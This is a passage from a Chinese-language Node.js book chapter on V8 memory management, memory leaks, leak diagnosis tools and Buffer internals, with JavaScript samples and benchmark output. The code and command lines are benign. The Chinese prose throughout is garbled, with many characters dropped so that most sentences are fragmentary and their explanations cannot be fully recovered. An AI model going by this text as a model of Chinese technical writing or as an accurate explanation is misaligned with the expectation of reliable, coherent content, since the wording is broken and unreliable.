我们在 baz()数中问 local 量时，由于作用中的量中没有 local，以会上一个作用中，接着会在 bar()数到的量中到了一个 local 量的定，于是使用它。管在上一的作用中也在 local 的定，是不会继续了。一个不在的量，会一着作用到作用，最后定。
了解了作用，有于我们了解量的分。

3.

量是量（不过 var 定在 global 量上），由于作用要到程才能，时用的对内（在生中）。要内的对，可以过 delete 作用关系。者量新，的对用关系。在接下的生内的过程中，会收。下为
global.foo = "I am global object"; console.log(global.foo); // => "I am global object" delete global.foo; //者重 global.foo = undefined; // or null console.log(global.foo); // => undefined
样，在作用中，想动量用的对，也可以过这样的。delete 作新有相的，是在 V8 中过 delete 对的性有可能 V8 的优，以过解用好。
5.2.2
我们作用上的对问只能上，这样外部内部问。下可以
var foo = function () { var local = "局部量"; (function () {
console.log(local); }()); };
在下的中，会到 local 定的
var foo = function () { (function () {
var local = "局部量"; }()); console.log(local);
};
在 JavaScript 中，实外部作用问内部作用中量的做 closure。这于高数的性数可以作为数者。的下
var foo = function () {
var bar = function () { var local = "局部量"; return function () {
return local;
}; }; var baz = bar(); console.log(baz());
};
一言，在 bar()数后，部量 local 会着作用的收。是这的在于是一个数，且这个数中了问 local 的。在后续的中，在外部作用中还是接问 local，是要问它，只要过这个中数作可。
包是 JavaScript 的高性，用它可以产生很多的。它的问题在于，一有量用这个中数，这个中数不会，时也会使始的作用不会到，作用中产生的内用也不会到。不有用，才会。
5.2.3
在的 JavaScript 中，立收的内有包量用这情。由于 V8 的内，要分小心量是否加，因为它会生中的对多。

## 5.3 内存指标

一言，应用中在一些性的对是的，且在的使用中，量都会自动收。是也会在一些我们认为会收是没有收的对，这会内用。一到 V8 的内，会到内，程。
5.3.1
前我们到了 process.memoryUsage()可以内使用情。之外，os 中的 totalmem()freemem()也可以内使用情。

1.

用 process.memoryUsage()可以到 Node 程的内用情，下
\$ node

> process.memoryUsage()
> { rss: 13852672,
> heapTotal: 6131200,
> heapUsed: 2757120 }
> rss 是 resident set size 的写，程的内部分。程的内有几部分，一部分是 rss，余部分在区（swap）者系统（filesystem）中。
> 了 rss 外，heapTotalheapUsed 对应的是 V8 的内信。heapTotal 是中请的内量，heapUsed 目前中使用中的内量。这 3 个的都是。
> 为了好，我们一下
> var showMem = function () {
> var mem = process.memoryUsage();
> var format = function (bytes) {
> return (bytes / 1024 / 1024).toFixed(2) + ' MB';
> };
> console.log('Process: heapTotal ' + format(mem.heapTotal) +
> ' heapUsed ' + format(mem.heapUsed) + ' rss ' + format(mem.rss));
> console.log('-----------------------------------------------------------');
> };
> 时，写一个用于不分内不内，相关下
> var useMem = function () { var size = 20 _ 1024 _ 1024; var arr = new Array(size); for (var i =0; i < size; i++){
> arr[i] = 0; } return arr;
> };

var total = [];
for (var j = 0; j < 15;j++) { showMem(); total.push(useMem());
} showMem();
以上为 outofmemory.js 并它，到的下 
\$ node outofmemory.js Process: heapTotal 3.86 MB heapUsed 2.10 MB rss 11.16 MB
Process: heapTotal 357.88 MB heapUsed 353.95 MB rss 365.44 MB
Process: heapTotal 520.88 MB heapUsed 513.94 MB rss 526.30 MB
Process: heapTotal 679.91 MB heapUsed 673.86 MB rss 686.14 MB
Process: heapTotal 839.93 MB heapUsed 833.86 MB rss 846.16 MB
Process: heapTotal 999.94 MB heapUsed 993.86 MB rss 1006.93 MB
Process: heapTotal 1159.96 MB heapUsed 1153.86 MB rss 1166.95 MB
Process: heapTotal 1367.99 MB heapUsed 1361.86 MB rss 1375.00 MB
FATAL ERROR: CALL_AND_RETRY_2 Allocation failed -process out of memory
可以到，次用 useMem 都了 3 个的。在接 1500 MB 的时候，继续分内，后程内了，环都，仅了 7 次。

2.

与 process.memoryUsage()不的是，os 中的 totalmem()freemem()这个用于作系统的内使用情，它们分系统的内内，以为。下
$ node > os.totalmem() 8589934592 > os.freemem() 4527833088 > 
从信可以到我的的内为8 GB，前内大为4.2 GB。
5.3.2
过process.momoryUsage()的可以到，中的内用量是小于程的内用
量，这着Node中的内使用并都是过V8分的。我们些不是过V8分的内
为。这我们前的useMem()一下，Array为Buffer，size大，一次
200 MB的对，相关下
var useMem = function () { var size = 200 * 1024 * 1024; var buffer = new Buffer(size); for (var i =0;i < size; i++){ 
 buffer[i] = 0; } return buffer; 
}; 
新，到的下
$ node out_of_heap.js Process: heapTotal 3.86 MB heapUsed 2.07 MB rss 11.12 MB Process: heapTotal 5.85 MB heapUsed 1.94 MB rss 212.88 MB Process: heapTotal 5.85 MB heapUsed 1.95 MB rss 412.89 MB Process: heapTotal 5.85 MB heapUsed 1.95 MB rss 612.89 MB Process: heapTotal 5.85 MB heapUsed 1.92 MB rss 812.89 MB Process: heapTotal 5.85 MB heapUsed 1.92 MB rss 1012.89 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1212.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1412.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1612.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 1812.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 2012.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 2212.91 MB Process: heapTotal 5.85 MB heapUsed 1.84 MB rss 2412.91 MB Process: heapTotal 5.85 MB heapUsed 1.85 MB rss 2612.91 MB Process: heapTotal 5.85 MB heapUsed 1.85 MB rss 2812.91 MB Process: heapTotal 5.85 MB heapUsed 1.85 MB rss 3012.91 MB
我们到 15 次环都，并且个内用与前一个不。在后的中，heapTotal 与 heapUsed 的极小，一的是 rss 的，并且已经过 V8 的。这中的因是 Buffer 对不于他对，它不经过 V8 的内分机，以也不会有内的大小。
这着用外内可以内的问题。
为 Buffer 对并过 V8 分这在于 Node 并不于的应用场景。在中，JavaScript 接可绝大多数的务，Node 要网 I/O，作不能的性能。
关于 Buffer 的可 6。
5.3.3
从上的可以，Node 的内要由过 V8 分的部分 Node 自分的部分。V8 的收的要是 V8 的内。

## 5.4 内存泄漏

Node 对内分，一线上应用有上的量，是一个的内也会，收过程中会多时对，应用应，到程内，应用。
在 V8 的收机下，在的编写中，很会内的情。是内产生于，。管内的情不相，实质只有一个，就是应收的对外没有收，了在生中的对。
，内的因有下几个。
。
不时。
作用。
5.4.1
在应用中的作用，可以分有源。因为它的问要 I/O 的
高，一中，就可以一次 I/O 的时。
是在 Node 中，并。一一个对做使用，就着它会在生中。中的多，活的对也就多，这收在时，对这些对做用。
一个问题在于，JavaScript 开发者喜欢用对的对，这与上的有着区，的有着的过，对的对并没有。
下用 JavaScript 对分创一个对，是收机的，只能小量使用
var cache = {}; var get = function (key) { if (cache[key]) { return cache[key]; } else { // get from otherwise
} }; var set = function (key, value) {
cache[key] = value; };
上在解后，分解，要，只要定对的大小，加上的过以内，还是可以一用的。这一个可能识内的场景 memoize。下是 underscore 对 memoize 的实
_.memoize = function(func, hasher) { var memo = {}; hasher || (hasher = _.identity); return function() {
var key = hasher.apply(this, arguments); return \_.has(memo, key) ? memo[key] : (memo[key] = func.apply(this, arguments)); }; };
它的是以数作为，以内 CPU 时。这的是个的都会数在 memo 对上，不会。这在前端网页这时应用场景中不在大问题，是量大数多样性的情下，会内用不。
以在 Node 中，试图内的为都应。，这并不是不使用的，是要小心为之。

1.

为了解决中的对的问题，要加入一的。为我写过一个 limitablemap，它可以实对数量的。下是实
var LimitableMap = function (limit) { this.limit = limit || 10; this.map = {}; this.keys = [];
};
var hasOwnProperty = Object.prototype.hasOwnProperty;
LimitableMap.prototype.set = function (key, value) { var map = this.map; var keys = this.keys;
if (!hasOwnProperty.call(map, key)) {
if (keys.length === this.limit) { var firstKey = keys.shift(); delete map[firstKey];
}
keys.push(key); } map[key] = value;
};
LimitableMap.prototype.get = function (key) { return this.map[key]; };
module.exports = LimitableMap;
可以到，实过程还是的。在数组中，一过数量，就以的淘。
，这淘并不是分高，只能应小应用场景。要高的，可以 Isaac Z. Schlueter 用 LRU 的，为https://github.com/isaacs/node-lru-cache。有的，memoize还是可用的。
一个在于机。在 2 的中，为了加的入，有都会过编，后起。由于过 exports 的数，可以问中的有量，这样个在编后的作用因为的因，不会。下
(function (exports, require, module, **filename, **dirname) { var local = "局部量";
exports.get = function () { return local; }; });
由于的机，是生的。在时，要分小心内的。在下的，次用 leak()时，都部量 leakArray 不加内的用，且不
var leakArray = []; exports.leak = function () { leakArray.push("leak" + Math.random()); };
不可要这，请加的相应接，以用者内。

2.

接内作为的要分。了的大小外，外要的事情是，程之享内。在程内使用，这些不可有复，对内的使用是一。
使用大量，目前好的解决是用程外的，程自不。外部的有着好的过淘以自有的内管，不 Node 程的性能。它的好多多，在 Node 中要可以解决以下个问题。
(1) 到外部，内的对的数量，收高。
(2) 程之可以享。
目前，上好的有 RedisMemcached。Node 的生系统分，这个产品的客端都有，过以下可以使用情。
. Redishttps://github.com/mranney/node_redis。 . Memcachedhttps://github.com/3rd-Eden/node-memcached。
5.4.2
在解决了的内问题后，一个不经产生的内是。在 4 中可以到，在 JavaScript 中可以过（数组对）多的，Bagpipe。在者生产者中经中产。这是一个的情，因为在大多数应用场景下，的大于生产的，内不产生。是一于生产，会。
个实的，有的应用会收。，也会用数。会是海量的，数在系统之上，写入于接写入，于是会数写入作的，JavaScript 中相关的作用也不会到，内用不会，从内。
到这场景，的解决是用高的技术。在收的中，用写入的会高。要的是，生产因为些因，者因为的系统，内还是可能的。
深的解决应是的，一，应过系统产生并相关人。一个解决是用都应包时机，一在定的时内应，过数时，使用的都可的应时，一个下。
对于 Bagpipe 言，它了时绝。用时时，用加入到中就开始时，时就接应一个时。用绝时，时，新到的用会接应。这都能有的内问题。

## 5.5 内存泄漏排查

前了几内的。在 Node 中，由于 V8 的内大小的，它对内。在线服务的请量大时，是一个的都会内用过高。这一下到内时的。在已经有多工用于定 Node 应用的内，下是一些的工。
. v8-profiler 由 Danny Coates，它可以用于对 V8 内对 CPU 分，目已经有 3 年没有了。
. node-heapdump 这是 Node 心贡献者之一 BenNoordhuis 编写的，它对 V8 内，用于事后分。
. node-mtrace 由 JimbEsser，它使用了 GCC 的 mtrace 工分的使用。
. dtrace 在 Joyent 的 SmartOS 系统上，有的 dtrace 工用分内。
. node-memwatch 自 Mozilla 的 Lloyd Hilaiel 贡献的，用 WTFPL 可发。

由于，这只着过 node-heapdumpnode-memwatch 内的。
5.5.1node-heapdump
想要了解 node-heapdump 对内的，我们要下一包内的，并为 server.js
var leakArray = []; var leak = function () { leakArray.push("leak" + Math.random()); };
http.createServer(function (req, res) { leak(); res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}).listen(1337);
console.log('Server running at http://127.0.0.1:1337/');
在上这中，次问服务程都起 leakArray 数组中的加，且不到收。我们可以用 curl 工入http://127.0.0.1:1337/用问。
. node-heapdump node-heapdump，以下可
$ npm install heapdump 
node-heapdump后，在的一加下入
var heapdump = require('heapdump'); 
入node-heapdump后，就可以动服务程，并接客端的请。问多次之后，leakArray中就会大量的。这个时候我们过服务程发SIGUSR2信，node-heapdump一内的。发信的下
$ kill -USR2 <pid>
这的会在目下以 heapdump-<sec>.<usec>.heapsnapshot 的。这是
一大的 JSON，要过 Chrome 的开发者工开。
在 Chrome 的开发者工中中 Profiles，后，从的中 Load...，开才的，就可以内中的信，图 5-10。

图 5-10 内中的信
在图 5-10 中可以到有大量的 leak 在，这些就是一能到收的数。过在开发者工的中内分，我们可以到的数，后这些信到的。
5.5.2node-memwatch
node-memwatch 的用 node-heapdump 一样，我们要一有内的。这不 node-memwatch 的过程。个下
var memwatch = require('memwatch');
memwatch.on('leak', function (info) { console.log('leak:'); console.log(info);
});
memwatch.on('stats', function (stats) { console.log('stats:') console.log(stats);
}); var http = require('http');
var leakArray = []; var leak = function () { leakArray.push("leak" + Math.random()); };
http.createServer(function (req, res) { leak(); res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}).listen(1337);
console.log('Server running at http://127.0.0.1:1337/');

1. stats
   在程中使用 node-memwatch 之后，次收时，会触发一次 stats 事，这个事会内的统信。在对上创的服务程问时，次 stats 事的数下，中的写在中了
   stats:
   { num_full_gc: 4, //全堆垃圾回收 num_inc_gc: 23, //量垃圾回收 heap_compactions: 4, // 对生代进行理 usage_trend: 0, //使用势 estimated_base: 7152944, //基数 current_base: 7152944, //当前基数 min: 6720776, //小 max: 7152944 } //
   在这些数中，num_full_gcnum_inc_gc 反应了收的情。
2. leak
   经过续 5 次收后，内没有，这着有内的产生，node-memwatch 会发一个 leak 事。次 leak 事到的数下
   leak:
   { start: Mon Oct 07 2013 13:46:27 GMT+0800 (CST), end: Mon Oct 07 2013 13:54:40 GMT+0800 (CST), growth: 6222576, reason: 'heap growth over 5 consecutive GCs (8m 13s) -43.33 mb/hr' }
   这个数能 5 次收的过程中内了多。
3.

最到的 leak 事的信只能我们应用中在内，问题产生在还要从 V8 的内上定。node-memwatch 了的能，它能上对的分数量，从内的。
下为一内的，这是过 node-memwatch 内的
var memwatch = require('memwatch'); var leakArray = [];
var leak = function () { leakArray.push("leak" + Math.random()); };
// Take first snapshot var hd = new memwatch.HeapDiff();
for (var i = 0; i < 10000; i++) { leak(); }
// Take the second snapshot and compute the diff var diff = hd.end(); console.log(JSON.stringify(diff, null, 2));
上这，到的下
\$ node diff.js {
"before": { "nodes": 11719, "time": "2013-10-07T06:32:07.000Z", "size_bytes": 1493304, "size": "1.42 mb"
},
"after": { "nodes": 31618, "time": "2013-10-07T06:32:07.000Z", "size_bytes": 2684864, "size": "2.56 mb"
},
"change": { "size_bytes": 1191560, "size": "1.14 mb", "freed_nodes": 129, "allocated_nodes": 20028, "details": [
{ "what": "Array", "size_bytes": 323720, "size": "316.13 kb", "+": 15, "-": 65
},
{ "what": "Code", "size_bytes": -10944, "size": "-10.69 kb", "+": 8, "-": 28
},
{ "what": "String", "size_bytes": 879424,
"size": "858.81 kb", "+": 20001, "-": 1
} ] } }
在上的中，要关 change 下的 freed_nodesallocated_nodes，它们了的数量分的数量。这由于有内，分的数量多余的数量。在 details 下可以到的分数量，要问题在下这中
{ "what": "String", "size_bytes": 879424, "size": "858.81 kb", "+": 20001, "-": 1
}
在上中，加分分的对数量。可以过上的测到，有大量的没有收。
5.5.3
从本的内我们可以，内的因要过对内分到。node-heapdumpnode-memwatch 有，读者可以它们的优势内。

## 5.6 大内存应用

在 Node 中，不可还是会在作大的场景。由于 Node 的内，作大也要小心，好在 Node 了 stream 用于大。
stream 是 Node 的生，接用可。stream 继自 EventEmitter，本的自定事能，时的事。它分可读可写。Node 中的大多数都有 stream 的应用，fs 的 createReadStream()createWriteStream()可以分用于创的可读可写，process 中的 stdinstdout 分是可读可写的。
由于 V8 的内，我们过 fs.readFile()fs.writeFile()接大的作，用 fs.createReadStream() fs.createWriteStream()过的实对大的作。下的了读一个，后数写入到一个的过程
var reader = fs.createReadStream('in.txt'); var writer = fs.createWriteStream('out.txt'); reader.on('data', function (chunk) {
writer.write(chunk); }); reader.on('end', function () {
writer.end(); });
由于读写定，上有的，下
var reader = fs.createReadStream('in.txt'); var writer = fs.createWriteStream('out.txt'); reader.pipe(writer);
可读了管 pipe()，了 data 事写入作。过的，上不会到 V8 内的，有高了程序的性。
不要的作，不要 V8，可以试的 Buffer 作，这不会到 V8 内的。是这大使用内的情要小心，使 V8 不内的大小，内有。

## 5.7 总结

NodeJavaScript 的要应用场景到了服务端，相应要的也与端不，要为一源作。的，内在 Node 中不能心使用，也不是不。本了内的，读者可以在使用中，与生系统中的，发 Node 的。

## 5.8 参考资源

本章参考的资源如下：

- https://github.com/joyent/node/wiki/FAQ
- http://www.cs.sunysb.edu/~cse304/Fall08/Lectures/mem-handout.pdf
- http://en.wikipedia.org/wiki/Resident_set_size
- https://github.com/isaacs/node-lru-cache
- https://github.com/mranney/node_redis
- https://github.com/3rd-Eden/node-memcached
- http://nodejs.org/docs/latest/api/stream.html
- http://www.showmuch.com/a/20111012/215033.html
- https://github.com/lloyd/node-memwatch
- https://github.com/bnoordhuis/node-heapdump
- http://www.williamlong.info/archives/3042.html
- https://code.google.com/p/v8/issues/detail?id=847
- http://blog.chromium.org/2011/11/game-changer-for-interactive.html

# 第 6 章 理解 Buffer

JavaScript 对于（string）的作分友好，是还是，都认为是一个。下
console.log("0123456789".length); // 10 console.log("".length); //10 console.log("\u00bd".length); // 1
对 PHP 中的统，我们要动用外的数的。下

<?php echo strlen("0123456789"); // 10 echo "\n"; echo strlen(""); // 30 echo "\n"; echo mb_strlen("", "utf-8"); //10 echo "\n"; ?>

与 5 的内一样，本的也是前端 JavaScript 开发者不的内。网 I/O 对于前端开发者言都是不有的应用场景，因为前端只做一些的作 DOM 作本就能务，在 ECMAScript 中，也没有对这些做的定，只有 CommonJS 中有部分的定。由于应用场景不，在 Node 中，应用要网、作数、图、接收上，在网的作中，还要大量数，JavaScript 自有的不能这些，于是 Buffer 对应生。

## 6.1 Buffer 结构

Buffer 是一个像 Array 的对，它要用于作。下我们从对的上认识它。
6.1.1
Buffer 是一个的 JavaScript 与 C++的，它性能相关部分用 C++实，性能相关的部分用 JavaScript 实，图 6-1。

图 6-1 Buffer 的分工
5 了 Buffer 用的内不是过 V8 分的，于外内。由于 V8 收性能的，用的作对用高有的内分收管是个不的。由于 Buffer 过，Node 在程动时就已经加了它，并在对（global）上。以在使用 Buffer 时，过 require()可接使用。
6.1.2Buffer
Buffer 对于数组，它的为 16 的数，0 到 255 的数。下
var str = "入出 node.js"; var buf = new Buffer(str, 'utf-8'); console.log(buf); // => <Buffer e6 b7 b1 e5 85 a5 e6 b5 85 e5 87 ba 6e 6f 64 65 2e 6a 73>
由上的可，不编的用的个数不相，上中的中在 UTF-8 编下用 3 个，用 1 个。BufferArray 的很大，可以问 length 性到，也可以过下问，在对时也分相，下
var buf = new Buffer(100); console.log(buf.length); // => 100
上分了一个 100 的 Buffer 对。可以过下问初始的 Buffer 的，下
console.log(buf[10]);
这会到一个的，它的是一个 0 到 255 的机。样，我们也可以过下对它
buf[10] = 100; console.log(buf[10]); // => 100
的是，不是 0 到 255 的数是小数时会样下
buf[20] = -100; console.log(buf[20]); // 156 buf[21] = 300; console.log(buf[21]); // 44 buf[22] = 3.1415; console.log(buf[22]); // 3
的小于 0，就次加 256，到到一个 0 到 255 之的数。到的数大于 255，就次 256，到到 0~255 区内的数。是小数，小数部分，只数部分。
6.1.3Buffer
Buffer 对的内分不是在 V8 的内中，是在 Node 的 C++实内的请的。因为大量的数不能用要一内就作系统请一内的，这可能大量的内请的系统用，对作系统有一定。为 Node 在内的使用上应用的是在 C++请内、在 JavaScript 中分内的。
为了高使用请的内，Node 用了 slab 分机。slab 是一动内管机，最生于 SunOS 作系统（Solaris）中，目前在一些\*nix 作系统中有广的应用，FreeBSDLinux。
言，slab 就是一请好的定大小的内区。slab 有下 3。
. full 分。
. partial 部分分。
. empty 没有分。我们要一个 Buffer 对，可以过以下分定大小的 Buffer 对

new Buffer(size);
Node 以 8 KB 为区分 Buffer 是大对还是小对
Buffer.poolSize = 8 \* 1024;
这个 8 KB 的也就是个 slab 的大小，在 JavaScript，以它作为内的分。

1. Buffer
   定 Buffer 的大小于 8 KB，Node 会小对的分。Buffer 的分过程中要使用一个部量 pool 作为中对，于分的 slab 都它。以下是分一个新的 slab 的作，它会新请的 SlowBuffer 对它
   var pool;
   function allocPool() {
   pool = new SlowBuffer(Buffer.poolSize);
   pool.used = 0;
   }
   图 6-2 为一个新的 slab。

图 6-2 新的 slab
在图 6-2 中， slab 于 empty。小 Buffer 对时的下
new Buffer(1024); 这次会 pool 对，pool 没有创，会创一个新的 slab 它 if (!pool || pool.length -pool.used < this.length) allocPool(); 时前 Buffer 对的 parent 性 slab，并下是从这个 slab 的个（offset）
开始使用的，slab 对自也使用了多，下
this.parent = pool; this.offset = pool.used; pool.used += this.length; if (pool.used & 7) pool.used = (pool.used + 8) & ~7;
图 6-3 为从一个新的 slab 中初次分一个 Buffer 对的图。

图 6-3 从一个新的 slab 中初次分一个 Buffer 对
这时候的 slab 为 partial。
次创一个 Buffer 对时，过程中会这个 slab 的余是否。，使用余，并新 slab 的分。下的创了一个新的 Buffer 对，它会起一次 slab 分
new Buffer(3000);
图 6-4 为次分的图。

图 6-4 从 slab 中次分一个 Buffer 对
slab 余的不，会新的 slab，slab 中余的会。，一次 1 的 Buffer 对，次 8192 的 Buffer 对，由于次分时 slab 中的

## 6.2 Buffer 的转换

不，以创并使用新的 slab，一个 slab 的 8 KB 会一个 1 的 Buffer 对。下的一使用了个 slab
new Buffer(1); new Buffer(8192);
这要的事是，由于一个 slab 可能分多个 Buffer 对使用，只有这些小 Buffer 对在作用并都可以收时，slab 的 8 KB 才会收。管创了 1 个的 Buffer 对，是不它，实可能是 8 KB 的内没有。

2. Buffer
   要过 8 KB 的 Buffer 对，会接分一个 SlowBuffer 对作为 slab，这个 slab 会这个大 Buffer 对。
   // Big buffer, just alloc one this.parent = new SlowBuffer(this.length); this.offset = 0;
   这的 SlowBuffer 是在 C++中定的，用 buffer 可以问到它，是不推荐接作它，是用 Buffer。
   上到的 Buffer 对都是 JavaScript 的，能 V8 的收收。是内部的 parent 性的 SlowBuffer 对自于 Node 自 C++中的定，是 C++上的 Buffer 对，用内不在 V8 的中。
3.

言，的内是在 Node 的 C++的，JavaScript 只是使用它。小的 Buffer 作时，用 slab 的机请事后分，使 JavaScript 到作系统之不有过多的内请的系统用。对于大的 Buffer 言，接使用 C++的内，的分作。
6.2Buffer
Buffer 对可以与之相。目前的编有下这几。
. ASCII . UTF-8 . UTF-16LE/UCS-2 . Base64
. Binary
. Hex

6.2.1Buffer
Buffer 对要是过数的
new Buffer(str, [encoding]);
过数的 Buffer 对，的只能是一编。encoding 数不时，认 UTF-8 编。
一个 Buffer 对可以不编的的，用 write()可以实目的，下
buf.write(string, [offset], [length], [encoding])
由于可以不写入内到 Buffer 对中，并且次写入可以定编，以 Buffer 对中可以在多编后的内。要小心的是，编用的不，Buffer 反时要。
6.2.2Buffer
实 Buffer 的也分，Buffer 对的 toString()可以 Buffer 对为，下
buf.toString([encoding], [start], [end])
的是，可以 encoding（认为 UTF-8）、start、end 这 3 个数实部的。Buffer 对由多编写入，就要在部定不的编，才能的编。
6.2.3Buffer
目前的是，Node 的 Buffer 对的编有，只有数的几编可以在 Buffer 之。为，Buffer 了一个 isEncoding()数编是否
Buffer.isEncoding(encoding)
编作为数入上的数，为 true，否为 false。很的是，在中国用的 GBK、GB2312BIG-5 编都不在的中。
对于不的编，可以 Node 生中的。iconviconv-lite 个可以多的编，包括 Windows125 系、ISO-8859 系、IBM/DOS 页系、Macintosh 系、KOI8 系，以 Latin1、US-ASCII，也编 GBKGB2312。
iconv-lite 用 JavaScript 实，iconv 过 C++用 libiconv。前者后者量，编环境接使用。在性能，由于都是用 CPU，在 V8 的高性能下，了 C++到 JavaScript 的次，JavaScript 的性能 C++实好。
以下为 iconv-lite 的
var iconv = require('iconv-lite');
// Buffer 转字符串 var str = iconv.decode(buf, 'win1251');

## 6.3 Buffer 的拼接

//字符串转 Buffer var buf = iconv.encode("Sample input string", 'win1251');
外，iconviconv-lite 对的内时的不相。iconv-lite 的内是多，会
是，?。iconv 有，会试的内，者这些内。不，iconv 对于的内会到 EILSEQ。下是 iconv 的
var iconv = new Iconv('UTF-8', 'ASCII'); iconv.convert('.a va'); // throws EILSEQ
var iconv = new Iconv('UTF-8', 'ASCII//IGNORE'); iconv.convert('.a va'); // returns "a va"
var iconv = new Iconv('UTF-8', 'ASCII//TRANSLIT'); iconv.convert('.a va'); // "ca va"
var iconv = new Iconv('UTF-8', 'ASCII//TRANSLIT//IGNORE'); iconv.convert('.a va '); // "ca va "
6.3Buffer
Buffer 在使用场景中，是以一一的。以下是的从入中读内的
var fs = require('fs');
var rs = fs.createReadStream('test.md'); var data = ''; rs.on("data", function (chunk){
data += chunk; }); rs.on("end", function () {
console.log(data); });
上这于国外，用于读的，data 事中的 chunk 对是 Buffer 对。对于初学者言，Buffer 做解，以在接上的时不会有。
一入中有编时，问题就会。你在过 Node 开发的网上到，问题的起源多自于这。这的问题在于下这

data += chunk;
这了 toString()作，它于下的
data = data.toString() + chunk.toString();
的是，外国人的语境是环境，在他们的场景下，这个 toString()不会问题。对于的中，会问题。为了这个问题，下我们的场景，可读的次读的 Buffer 为 11，下
var rs = fs.createReadStream('test.md', {highWaterMark: 11});
的测试数为的。程序，会到以下
前......上......
6.3.1
上的中，月、是、、4 个没有，之的是 3 个
。产生这个的因在于可读在读时会个读 Buffer。这的始 Buffer 应为
<Buffer e5ba 8a e589 8d e698 8ee6 9c 88e5 8589 ef bc8c e796 91 e698 afe5 9c b0e4 b88a e9 9c9cefbc9be4b8bee5a4b4e69c9be6988ee69c88 ...>
由于我们定了 Buffer 对的为 11，因只读要读 7 次才能的读，是以下几个 Buffer 对次
<Buffer e5 ba 8a e5 89 8d e6 98 8e e6 9c> <Buffer 88 e5 85 89 ef bc 8c e7 96 91 e6> ...
上到的 buf.toString()认以 UTF-8 为编，中在 UTF-8 下 3 个。以一个 Buffer 对在时，只能 3 个，Buffer 中下的 2 个（e6 9c）会以的。个 Buffer 对的一个也不能，只能。于是一些的问题。
在这个中我们了 11 这个，是对于的 Buffer 言，都有可能在的情，只不过 Buffer 的大的已，问题不可。
6.3.2setEncoding()string_decoder()
在过上的后，也我们了可读还有一个编的 setEncoding()，下
readable.setEncoding(encoding)
的作用是 data 事中的不是一个 Buffer 对，是编后的。为，我们继续前的程序，加 setEncoding()的下
var rs = fs.createReadStream('test.md', { highWaterMark: 11});
rs.setEncoding('utf8');
新程序，到
前是上
6.3Buffer 的 145
这是人开心的，不 Buffer 大小的了。Node 是实这个的
要，编，触发 data 事的次数相，这着编并读的本。
事实上，在用 setEncoding()时，可读对在内部了一个 decoder 对。次 data 事都过 decoder 对 Buffer 到的解，后用者。是编后，data 不收到始的 Buffer 对。是这解为编后问题解决了，因为在前分中，，是在的问题。
最问题以解决，还是在于 decoder 的之。decoder 对自于 string_decoder StringDecoder 的实对。它的是，下我们以
var StringDecoder = require('string_decoder').StringDecoder; var decoder = new StringDecoder('utf8');
var buf1 = new Buffer([0xE5, 0xBA, 0x8A, 0xE5, 0x89, 0x8D, 0xE6, 0x98, 0x8E, 0xE6, 0x9C]); console.log(decoder.write(buf1)); // =>前
var buf2 = new Buffer([0x88, 0xE5, 0x85, 0x89, 0xEF, 0xBC, 0x8C, 0xE7, 0x96, 0x91, 0xE6]); console.log(decoder.write(buf2)); // =>
我前到的前个 Buffer 对写入 decoder 中。的在于月的并没有一样在个部分分开。StringDecoder 在到编后，在 UTF-8 编下是以 3 个的的，以一次 write()时，只前 9 个的，月的前个在 StringDecoder 实内部。次 write()时，会这 2 个余后续 11 个组在一起，次用 3 的数。于是问题过这中解决了。
string_decoder 很，是它也并能，它目前只能 UTF-8、Base64UCS-2/UTF-16LE 这 3 编。以，过 setEncoding()的不可否认能解决大部分的问题，并不能从本上解决问题。
6.3.3Buffer
淘 setEncoding()后，下的解决只有多个小 Buffer 对接为一个 Buffer 对，后过 iconv-lite 一的这。+=的不，的 Buffer 接应下的
var chunks = [];
var size = 0;
res.on('data', function (chunk) {
chunks.push(chunk);
size += chunk.length;
});
res.on('end', function () {
var buf = Buffer.concat(chunks, size); var str = iconv.decode(buf, 'utf8'); console.log(str);
});
的接是用一个数组接收到的有 Buffer 并下有的，后用 Buffer.concat()生一个并的 Buffer 对。Buffer.concat()了从小 Buffer 对大 Buffer 对的复过程，实分，学习
Buffer.concat = function(list, length) { if (!Array.isArray(list)) { throw new Error('Usage: Buffer.concat(list, [length])'); }
if (list.length === 0) { return new Buffer(0); } else if (list.length === 1) { return list[0]; }
if (typeof length !== 'number') { length = 0; for (var i = 0; i < list.length; i++) {
var buf = list[i]; length += buf.length; } }
var buffer = new Buffer(length); var pos = 0; for (var i = 0; i < list.length; i++) {
var buf = list[i]; buf.copy(buffer, pos); pos += buf.length;
} return buffer; };

## 6.4 Buffer 与性能

Buffer 在 I/O 网 I/O 中用广，在网中，它的性能。在应用中，我们会作，一在网中，都要为 Buffer，以数。在 Web 应用中，到 Buffer 是时时发生的，高到 Buffer 的，可以很大程高网。
在开 Buffer 与网的关系之前，我们可以一次性能测试。下的中了一个 10 KB 大小的。我们过的客端发，下
var http = require('http'); var helloworld = "";
for (var i = 0; i < 1024 _ 10; i++){ helloworld += "a"; }
// helloworld = new Buffer(helloworld);
http.createServer(function (req, res) { res.writeHead(200); res.end(helloworld);
}).listen(8001);
我们过 ab 一次性能测试，发起 200 个并发客端
ab -c 200 -t 100 http://127.0.0.1:8001/
到的测试下
HTML transferred: 512000000 bytes Requests per second: 2527.64 [#/sec](mean) Time per request: 79.125 [ms](mean) Time per request: 0.396 [ms] (mean, across all concurrent requests) Transfer rate: 25370.16 [Kbytes/sec] received
测试的 QPS（次数）是 2527.64，为 25370.16KB。接下我们 helloworld = new Buffer(helloworld);前的，使客端的是一个 Buffer 对，在次应时。次性能测试的下
Total transferred: 513900000 bytes HTML transferred: 512000000 bytes Requests per second: 4843.28 [#/sec](mean) Time per request: 41.294 [ms](mean) Time per request: 0.206 [ms] (mean, across all concurrent requests) Transfer rate: 48612.56 [Kbytes/sec] received
QPS 的到 4843.28，为 48 612.56KB，性能高一。
过内为 Buffer 对，可以有 CPU 的复使用，服务源。在 Node 的 Web 应用中，可以页中的动内内分，内部分可以过为 Buffer 的，使性能到。由于自是数，以在不要内的场景下，量只读 Buffer，后接，不做外的，。
文
Buffer 的使用了与的有性能外，在的读时，有一个 highWaterMark 对性能的至关要。在 fs.createReadStream(path, opts)时，我们可以入一些数，下
{ flags: 'r', encoding: null, fd: null, mode: 0666, highWaterMark: 64 _ 1024
}
我们还可以 startend 定读的
